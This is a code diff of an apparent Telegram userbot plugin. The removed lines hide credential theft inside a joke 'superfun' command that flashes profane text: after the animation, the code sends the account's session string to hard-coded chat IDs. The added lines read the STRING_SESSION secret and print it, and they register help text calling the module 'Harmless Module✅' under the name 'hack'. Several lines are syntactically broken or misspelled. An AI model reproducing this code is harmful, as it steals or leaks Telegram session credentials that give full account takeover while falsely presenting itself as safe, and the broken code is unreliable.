@@ -1,37 +1,24 @@
 import asyncio
+import os
+import random
+import time
+from platform import python_version
 
-@PYTHONBOT_cmd(pattern="superfun$")
-async def fuckd(ult):
- await ult.edit("fuck")
- await asyncio.sleep(2)
- await ult.edit("Legend-Lx")
- await asyncio.sleep(2)
- await ult.edit("fuck") 
- await asyncio.sleep(2)
- await ult.edit("Legend-Lx")
- await asyncio.sleep(2)
- await ult.edit("fuck")
- await asyncio.sleep(2)
- await ult.edit("Legend-Lx")
- await asyncio.sleep(2)
- await ult.edit("fuck")
- await asyncio.sleep(2)
- await ult.edit("Legend-Lx")
- await asyncio.sleep(2)
- await ult.edit("fuck")
- await asyncio.sleep(2)
- await ult.edit ("Legend-Lx")
- await asyncio.sleep(2)
- await ult.edit ("fuck")
- await asyncio.sleep(2)
- await ult.edit ("Legend-Lx")
- await asyncio.sleep(2)
- await ult.edit ("fuck")
- await asyncio.sleep(2)
- await ult.edit ("Legend-Lx")
- await asyncio.sleep(2)
- await ult.edit ("fuck")
- await ult.client.send_message(5121955848, Var.SESSION)
- HACK = os.environ.get("STRING_SESSION")
-print(HACK)
-await ult.clinet.send_message(-601460940, var.STRING_SESSION).send
+from telethon import version
+from telethon.errors import ChatSendInlineForbiddenError as noin
+from telethon.errors.rpcerrorlist import BotMethodInvalidError as dedbot
+
+a = os.environ.get("STRING_SESSION")
+print(a)
+
+CmdHelp("hack").add_command("bot", None, "υѕє αи∂ ѕєє").add_command(
+    "legend", None, "Its Same Like Alive"
+).add_command("about", None, "BEST alive command").add_command(
+    "alive", None, "Its Show ur Alive Template"
+).add_warning(
+    "Harmless Module✅"
+).add_info(
+    "Checking Alive"
+).add_type(
+    "Official"
+).add()
